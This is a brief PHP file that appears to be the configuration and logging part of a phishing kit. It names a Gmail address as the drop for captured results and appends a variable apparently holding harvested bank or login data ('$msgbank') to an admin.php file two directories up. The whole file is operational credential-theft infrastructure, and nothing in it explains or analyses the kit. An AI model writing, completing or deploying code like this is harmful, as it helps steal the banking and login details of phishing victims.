<?php

$yourmail  = 'smtpus06@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);


$My_Name = "azert" ; 

$Name_page = "azert" ;


?>